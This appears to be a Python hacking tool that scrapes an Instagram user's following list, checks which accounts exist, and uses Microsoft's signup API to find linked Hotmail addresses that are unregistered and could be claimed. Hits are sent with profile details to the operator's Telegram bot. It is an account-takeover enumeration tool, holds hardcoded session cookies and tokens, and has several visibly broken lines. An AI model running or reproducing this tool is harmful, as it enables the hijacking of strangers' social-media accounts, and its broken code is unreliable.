import requests
from user_agent import *
import time
import os
import json
import webbrowser
webbrowser open('https://t.me/v3Python')

ID = input('RNTER YOUR ID =>')
token = input('ENTER YOUR TOKEN =>')
os.system('clear')

def ss():
	print('1-سحب لسته : Pull list')
	print('2-فحص السته : Six-point examination')
	
	
ss()



i = input('Enter The Numper =>')

if i == '1':


	nm = 0
	nn = 0
	ab = 0
	sessionid = input('Enter yuor sessionid =>')
	user = input('Enter yuor username =>')
	
	
	cookies = {
	    'ig_did': 'C5000B14-C007-4297-931D-988B622F5426',
	    'datr': 'L0h4aHX-XpN43taBi2bCfZ-B',
	    'ig_nrcb': '1',
	    'mid': 'aHhILwABAAFJkpRVlAEioZBcPfhc',
	    'dpr': '3.0234789848327637',
	    'ps_l': '1',
	    'ps_n': '1',
	    'csrftoken': 'y8s8gPL9IHaKVhwCiQ8sAvwLd9ejsBPn',
	    'ds_user_id': '75631189905',
	    'wd': '891x1671',
	    'sessionid': sessionid,
	    'rur': '"LDC\\05475631189905\\0541784313802:01fe1ddb3fd6745b6db452ac87b9fc5814e417eb581a2f623a15ffd20d23292272709d73"',
	}
	
	headers = {
	    'authority': 'www.instagram.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    # 'cookie': 'ig_did=C5000B14-C007-4297-931D-988B622F5426; datr=L0h4aHX-XpN43taBi2bCfZ-B; ig_nrcb=1; mid=aHhILwABAAFJkpRVlAEioZBcPfhc; dpr=3.0234789848327637; ps_l=1; ps_n=1; csrftoken=y8s8gPL9IHaKVhwCiQ8sAvwLd9ejsBPn; ds_user_id=75631189905; wd=891x1671; sessionid=75631189905%3AU0WWDKog2wPuQ7%3A12%3AAYdHJFylTM6DyzeQRHaiwSYbR4GmZB2XbrPoB__mLQ; rur="LDC\\05475631189905\\0541784313802:01fe1ddb3fd6745b6db452ac87b9fc5814e417eb581a2f623a15ffd20d23292272709d73"',
	    'referer': 'https://www.instagram.com/hamidsahari/following/',
	    'sec-ch-prefers-color-scheme': 'dark',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-model': '""',
	    'sec-ch-ua-platform': '"Linux"',
	    'sec-ch-ua-platform-version': '""',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': str(generate_user_agent()),
	    'x-asbd-id': '359341',
	    'x-csrftoken': 'y8s8gPL9IHaKVhwCiQ8sAvwLd9ejsBPn',
	    'x-ig-app-id': '936619743392459',
	    'x-ig-www-claim': 'hmac.AR3PQAW1I0Lb7-OMHiwJ7kfQ5E6Irynuf6f6uxqp0E_Sin2U',
	    'x-requested-with': 'XMLHttpRequest',
	    'x-web-session-id': 'tm069q:gxo4ha:abgnwt',
	}
	
	
	params = {
	    'username': user,
	}
	
	response = requests.get(
	    'https://www.instagram.com/api/v1/users/web_profile_info/',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	).json()
	
	try:
		fos = response['data']['user']['edge_follow']['count']
		id = response['data']['user']['id']
		
	except:
		print('اليوزر او السيشن غلط')
		exit()
	
	#_______________________________
	def ss(nm):
		global nn,ab
	
		params = {
		    'count': '12',
		    'max_id': nm,
		}
		
		response = requests.get(
		    f'https://www.instagram.com/api/v1/friendships/{id}/following/',
		    params=params,
		    cookies=cookies,
		    headers=headers,
		).json()
		
		while True:
			try:
				nn +=1
				ab+=1
			
				usus = response['users'][nn]['username']		
				print(f'{ab} : {usus}@hotmail.com')
				with open('v3python.txt','a') as v3:
					v3.write(f'{usus}@hotmail.com\n')
				
			except:
				ab+=12
				ss(nm)
				
			if ab == fos:
				print('dn')
				
				exit()
				
	ss(nm=0)


if i == '2':
	a = 0
	b = 0
	c = 0
	d = 0





def m():
	global a,b,c,d	
	file = open('v3python.txt','r').read().splitlines()
	
	for user in file:
		email = str(user)
	
		cookies = {
		    'ig_did': '14B3CA20-43A7-49DE-A14F-9B805FB50DBB',
		    'csrftoken': 'TdpLp175uY8P7kujPqQtuu',
		    'datr': 'NWFlaC3J3iL-Ki5FInRy3BKm',
		    'mid': 'aGVhYwABAAFFFiKshn6gv7Akg3MC',
		    'ig_nrcb': '1',
		    'ps_l': '1',
		    'ps_n': '1',
		    'dpr': '3.0234789848327637',
		    'wd': '891x1671',
		}
		
		headers = {
		    'authority': 'www.instagram.com',
		    'accept': '*/*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/x-www-form-urlencoded',
		  
		    'origin': 'https://www.instagram.com',
		    'referer': 'https://www.instagram.com/',
		    'sec-ch-prefers-color-scheme': 'dark',
		    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
		    'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-model': '""',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-ch-ua-platform-version': '""',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': str(generate_user_agent()),
		    'x-asbd-id': '359341',
		    'x-csrftoken': 'TdpLp175uY8P7kujPqQtuu',
		    'x-ig-app-id': '936619743392459',
		    'x-ig-www-claim': '0',
		    'x-instagram-ajax': '1024819639',
		    'x-requested-with': 'XMLHttpRequest',
		    'x-web-session-id': 'klmruf:a580mk:qwopwu',
		}
		
		
		tim = str(time.time()).split(".")[0]
		data = {
		    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:jdjdjficidjsjd',
		    'caaF2DebugGroup': '0',
		    'isPrivacyPortalReq': 'false',
		    'loginAttemptSubmissionCount': '0',
		    'optIntoOneTap': 'false',
		    'queryParams': '{}',
		    'trustedDeviceRecords': '{}',
		    'username': f'{email}@gmail.com',
		    'jazoest': '21992',
		}
		
		response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data).text
		if '"user":true' in response:
			a+=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'GOOD.INS : {a} | BAD.INS : {b} | GOOD.HOT : {c} | BAD.HOT : {d}')
			
			
				
			cookies = {
			    'mkt': 'ar-EG',
			    'mkt1': 'ar-EG',
			    'amsc': 'K1zYufy9+F//P1iYqdCkaPMnYNQslhO1YxXnmYvrySbAx3ZAb7ymuvbTB414HsrSOfbcSeBRaFO5F3wHYbTFQLV+6KD17v9WmBgZjNQTiZwkxXQJYbg2uxVUCv+uCgtHELbFhIuhbrBgNUMBjQkwbwgH90kezXq7PrAE47atVgN3iXYe/i0dXlGncZ0L4U3fZ/4skMnQWAyU/zjz2SP/dCCSyEm30rLzocToLLNvPPwZDXpW616zQcGh1+4vDvUEWr29qh7UVTA+zQuXAlzK/RPxhN5fKaV8eEd6kouimCY=:2:3c',
			    'ai_session': 'LzDqHlhr3puKtkcVc7wNmO|1752705239583|1752705239583',
			    'MUID': '36772bb3d8a14d94815296fea6cbd27c',
			    '_pxvid': 'f84aeecd-6294-11f0-ac8b-6660d3f5cd17',
			    'fptctx2': 'taBcrIH61PuCVH7eNCyH0F58uBDuZFZOunQHZt3Fugm9FYurx6n5hf97hiTXaw48FTFAtVyAdXUnlDfKeC5hojZULfnP%252bYOrHDaP4o1CzoAXzVMaYo5N2osjX5qIUfCS92Xu%252bVoECZea54htuBMdFM7iUi7r%252bA7CUHMVoSYD99dCjYcv7gMfL4FXdVdb9ObNp7O19hYLku3pusSlyWTQ%252fVmMv2Qtc6direIuOXwoVUSpwCxNJaWj%252fSSjOYFOG1RcHrtENRnKYlEbuJKa3Nijt2McJK1ecolEE93cHp8w8D9zg4hGKUaXSYcJuMGHA2e6BYzrGlg5EZN5AtUe0%252b9S1A%253d%253d',
			    '_px3': 'e8001b2ecd60df977f971b795b0827ca492312b6a9a06e5eee9e2ee7f9491e1b:CZDShckz0dERlFwGZUkxE8YO3rtk/NzhEmkUbCePfMWsIBBpmRNtAMlxVAr79F9hUDV1uoca3rlNoEhCWzWpHg==:1000:7JiXLJU0GeGp3xskLaCUk+j0Qi1B4cGbbPRiLUKHLGtUGc0/5e8AZhdQ4gUXW49bc0LiJrKtDFTEhPATw/Y4UNum+M4llmF6DNuCjGf/7mwzoMALtBEfLQDt+K99NUVHDXvTtP8AchRLyObNBCOpbuP7nB882u+DE9DrhZ2PPCERGz0qHCzazShlj/O5B3aHjOeRnOyJQbDcpkTcMBMtRedW1d7uKfgelPbEv38xh2g=',
			    'MSFPC': 'GUID=8b84d8d796354fada2cea4d54fbd78bd&HASH=8b84&LV=202507&V=4&LU=1752705222203',
			    '_pxde': '85eeed21e27de79438bd76f8edb2f2fd19884e1e82d5d35726c57aa45ff7ec58:eyJ0aW1lc3RhbXAiOjE3NTI3MDUyNDQxMTEsImZfa2IiOjAsImluY19pZCI6WyIxOThiN2QyNDQ1NDIwOTIzYTZiODU5OGI1MzFmMDAxMSJdfQ==',
			}
			
			headers = {
			    'Accept': 'application/json',
			    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
			    'Connection': 'keep-alive',
			    'Content-Type': 'application/json; charset=utf-8',
			    # 'Cookie': 'mkt=ar-EG; mkt1=ar-EG; amsc=K1zYufy9+F//P1iYqdCkaPMnYNQslhO1YxXnmYvrySbAx3ZAb7ymuvbTB414HsrSOfbcSeBRaFO5F3wHYbTFQLV+6KD17v9WmBgZjNQTiZwkxXQJYbg2uxVUCv+uCgtHELbFhIuhbrBgNUMBjQkwbwgH90kezXq7PrAE47atVgN3iXYe/i0dXlGncZ0L4U3fZ/4skMnQWAyU/zjz2SP/dCCSyEm30rLzocToLLNvPPwZDXpW616zQcGh1+4vDvUEWr29qh7UVTA+zQuXAlzK/RPxhN5fKaV8eEd6kouimCY=:2:3c; ai_session=LzDqHlhr3puKtkcVc7wNmO|1752705239583|1752705239583; MUID=36772bb3d8a14d94815296fea6cbd27c; _pxvid=f84aeecd-6294-11f0-ac8b-6660d3f5cd17; fptctx2=taBcrIH61PuCVH7eNCyH0F58uBDuZFZOunQHZt3Fugm9FYurx6n5hf97hiTXaw48FTFAtVyAdXUnlDfKeC5hojZULfnP%252bYOrHDaP4o1CzoAXzVMaYo5N2osjX5qIUfCS92Xu%252bVoECZea54htuBMdFM7iUi7r%252bA7CUHMVoSYD99dCjYcv7gMfL4FXdVdb9ObNp7O19hYLku3pusSlyWTQ%252fVmMv2Qtc6direIuOXwoVUSpwCxNJaWj%252fSSjOYFOG1RcHrtENRnKYlEbuJKa3Nijt2McJK1ecolEE93cHp8w8D9zg4hGKUaXSYcJuMGHA2e6BYzrGlg5EZN5AtUe0%252b9S1A%253d%253d; _px3=e8001b2ecd60df977f971b795b0827ca492312b6a9a06e5eee9e2ee7f9491e1b:CZDShckz0dERlFwGZUkxE8YO3rtk/NzhEmkUbCePfMWsIBBpmRNtAMlxVAr79F9hUDV1uoca3rlNoEhCWzWpHg==:1000:7JiXLJU0GeGp3xskLaCUk+j0Qi1B4cGbbPRiLUKHLGtUGc0/5e8AZhdQ4gUXW49bc0LiJrKtDFTEhPATw/Y4UNum+M4llmF6DNuCjGf/7mwzoMALtBEfLQDt+K99NUVHDXvTtP8AchRLyObNBCOpbuP7nB882u+DE9DrhZ2PPCERGz0qHCzazShlj/O5B3aHjOeRnOyJQbDcpkTcMBMtRedW1d7uKfgelPbEv38xh2g=; MSFPC=GUID=8b84d8d796354fada2cea4d54fbd78bd&HASH=8b84&LV=202507&V=4&LU=1752705222203; _pxde=85eeed21e27de79438bd76f8edb2f2fd19884e1e82d5d35726c57aa45ff7ec58:eyJ0aW1lc3RhbXAiOjE3NTI3MDUyNDQxMTEsImZfa2IiOjAsImluY19pZCI6WyIxOThiN2QyNDQ1NDIwOTIzYTZiODU5OGI1MzFmMDAxMSJdfQ==',
			    'Origin': 'https://signup.live.com',
			    'Referer': 'https://signup.live.com/signup?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d3073%26client_id%3d9199bf20-a13f-4107-85dc-02114787ef48%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26mkt%3dAR-EG%26opid%3d1703A2428C316978%26opidt%3d1752705234%26uaid%3da54069fdb68238b6c814b8f157b9df52%26contextid%3d874EB4F5CE25E842%26opignore%3d1&mkt=AR-EG&uiflavor=web&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&client_id=9199bf20-a13f-4107-85dc-02114787ef48&uaid=a54069fdb68238b6c814b8f157b9df52&suc=9199bf20-a13f-4107-85dc-02114787ef48&fluent=2&lic=1',
			    'Sec-Fetch-Dest': 'empty',
			    'Sec-Fetch-Mode': 'cors',
			    'Sec-Fetch-Site': 'same-origin',
			    'User-Agent': str(generate_user_agent()),
			    'canary': 'MAcBD2qNZm/hTHxvd2IzjaphRcLDg9PzOqOMpyTV9IH3sO5GaYgcOj9WUmhK0XQaUvqzHjS6skzROOp6SgtxbhBAAApKqfQiXK3EDzJvdqaAJ/U1PzWBcEwnSgHpk0MUPitZQDDzVkTAk1QJGPuW8IzAinKeEUUT3yKPFWzgj57l0S2BltgEO21YgGk/1Q98FzhZf0Ed+ns7S51GH/5/xyEHImus+iJ2a3AQBCBVsaaSCG2c2lrBhqrniDLJrY53:2:3c',
			    'client-request-id': 'a54069fdb68238b6c814b8f157b9df52',
			    'correlationId': 'a54069fdb68238b6c814b8f157b9df52',
			    'hpgact': '0',
			    'hpgid': '200225',
			    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
			    'sec-ch-ua-mobile': '?1',
			    'sec-ch-ua-platform': '"Android"',
			}
			
			json_data = {
			    'includeSuggestions': True,
			    'signInName': f'{email}@hotmail.com',
			    'uiflvr': 1001,
			    'scid': 100118,
			    'uaid': 'a54069fdb68238b6c814b8f157b9df52',
			    'hpgid': 200225,
			}
			
			response = requests.post(
			    'https://signup.live.com/API/CheckAvailableSigninNames?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d3073%26client_id%3d9199bf20-a13f-4107-85dc-02114787ef48%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26mkt%3dAR-EG%26opid%3d1703A2428C316978%26opidt%3d1752705234%26uaid%3da54069fdb68238b6c814b8f157b9df52%26contextid%3d874EB4F5CE25E842%26opignore%3d1&mkt=AR-EG&uiflavor=web&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&client_id=9199bf20-a13f-4107-85dc-02114787ef48&uaid=a54069fdb68238b6c814b8f157b9df52&suc=9199bf20-a13f-4107-85dc-02114787ef48&fluent=2&lic=1',
			    cookies=cookies,
			    headers=headers,
			    json=json_data,
			).text
			
			if '"isAvailable":true' in response:
				c+=1
				os.system('cls' if os.name == 'nt' else 'clear')
				print(f'GOOD.INS : {a} | BAD.INS : {b} | GOOD.HOT : {c} | BAD.HOT : {d}')
				
				
				cookies = {
				    'ig_did': '14B3CA20-43A7-49DE-A14F-9B805FB50DBB',
				    'csrftoken': 'TdpLp175uY8P7kujPqQtuu',
				    'datr': 'NWFlaC3J3iL-Ki5FInRy3BKm',
				    'mid': 'aGVhYwABAAFFFiKshn6gv7Akg3MC',
				    'ig_nrcb': '1',
				    'ps_l': '1',
				    'ps_n': '1',
				    'dpr': '3.0234789848327637',
				    'wd': '891x1671',
				}
				
				headers = {
				    'authority': 'www.instagram.com',
				    'accept': '*/*',
				    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
				    # 'cookie': 'ig_did=14B3CA20-43A7-49DE-A14F-9B805FB50DBB; csrftoken=TdpLp175uY8P7kujPqQtuu; datr=NWFlaC3J3iL-Ki5FInRy3BKm; mid=aGVhYwABAAFFFiKshn6gv7Akg3MC; ig_nrcb=1; ps_l=1; ps_n=1; dpr=3.0234789848327637; wd=891x1671',
				    'referer': 'https://www.instagram.com/leomessi/',
				    'sec-ch-prefers-color-scheme': 'dark',
				    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
				    'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
				    'sec-ch-ua-mobile': '?0',
				    'sec-ch-ua-model': '""',
				    'sec-ch-ua-platform': '"Linux"',
				    'sec-ch-ua-platform-version': '""',
				    'sec-fetch-dest': 'empty',
				    'sec-fetch-mode': 'cors',
				    'sec-fetch-site': 'same-origin',
				    'user-agent': str(generate_user_agent()),
				    'x-asbd-id': '359341',
				    'x-csrftoken': 'TdpLp175uY8P7kujPqQtuu',
				    'x-ig-app-id': '936619743392459',
				    'x-ig-www-claim': '0',
				    'x-requested-with': 'XMLHttpRequest',
				    'x-web-session-id': 'i6xcyp:8ohw5v:8jmp6e',
				}
				
				params = {
				    'username': email,
				}
				
				try:
				
					response = requests.get(
					    'https://www.instagram.com/api/v1/users/web_profile_info/',
					    params=params,
					    cookies=cookies,
					    headers=headers,
					).json()
				except json.decoder.JSONDecodeError:
					continue
				
				
				io = response['data']['user'][ 'biography']
				fol = response['data']['user']['edge_followed_by']['count']
				fos = response['data']['user']['edge_follow']['count']
				ido = response['data']['user']['id']
				nam = response['data']['user']['full_name']
																
				isp = response['data']['user']['is_private']
				op = response['data']['user']['edge_owner_to_timeline_media']['count']
																
				ff = f'''
				╔══✪〘 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 〙✪══╗
				[*] NAME        : {nam}
				[*] USER        : {email}
				[*] EMAIL       : {email}
				[*] FOLLOWERS   : {fol}
				[*] FOLLOWING   : {fos}
				[*] ID          : {ido}
				[*] POSTS       : {op}
				[*] LINK        : https://www.instagram.com/{email}
				╚═══════✪〘 BY : @S_O_F3 〙✪═══════╝
				'''
				tlg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}')
				i = requests
				post(tlg)		
				
			else:
				d+=1
				os.system('cls' if os.name == 'nt' else 'clear')
				print(f'GOOD.INS : {a} | BAD.INS : {b} | GOOD.HOT : {c} | BAD.HOT : {d}')
				
			
		else:
			b+=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'GOOD.INS : {a} | BAD.INS : {b} | GOOD.HOT : {c} | BAD.HOT : {d}')
			
			
m()
			
		
			
			
			
	